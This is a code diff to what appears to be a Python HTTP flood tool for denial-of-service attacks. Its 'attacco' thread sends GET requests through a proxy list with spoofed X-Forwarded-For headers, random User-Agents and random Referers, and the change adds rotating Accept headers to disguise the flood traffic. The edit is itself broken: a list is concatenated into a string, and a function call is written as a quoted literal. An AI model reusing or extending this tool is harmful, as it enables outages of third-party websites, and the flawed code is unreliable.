@@ -67,7 +67,7 @@ class attacco(threading.Thread):
         useragent = "User-Agent: " + randomUserAgent() + "\r\n"
         forward   = "X-Forwarded-For: " + randomIpList() + "\r\n"
         referer   = "Referer: "+ randomReFerer() + url + "?r="+ str(random.randint(1, 1000)) + "\r\n"
-        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"
+        httprequest = get_host + useragent + referer + accept + forward + connection + acceptall + "\r\n"
  
         while nload:
             time.sleep(1)
@@ -107,7 +107,8 @@ proxyf = in_file.read()
 in_file.close()
 listaproxy = proxyf.split('\n')
 get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
-accept = "Accept-Encoding: gzip, deflate\r\n"
+acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
+accept = "random.choice(acceptall) \r\n"
 connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
 nload = 1
 x = 0
